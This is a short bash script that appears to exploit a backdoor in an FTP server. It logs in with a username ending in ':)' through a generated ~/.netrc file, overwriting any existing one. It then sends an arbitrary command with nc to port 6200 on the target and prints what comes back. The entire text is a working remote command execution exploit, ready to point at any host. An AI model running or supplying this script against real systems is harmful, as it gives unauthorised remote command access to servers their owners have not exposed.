#!/bin/bash

HOST="$1"
PORT=6200

cat >~/.netrc <<EOF
machine $HOST
login test:)
password test
EOF

chmod 0600 ~/.netrc
nohup ftp "$HOST" >/dev/null 2>&1 &

RESPONSE=$(echo "$2" | timeout 0.5s nc "$HOST" "$PORT")
if [[ -n "$RESPONSE" ]]; then
  echo "[+] worked: $RESPONSE"
else
  echo "[-] no response!"
fi
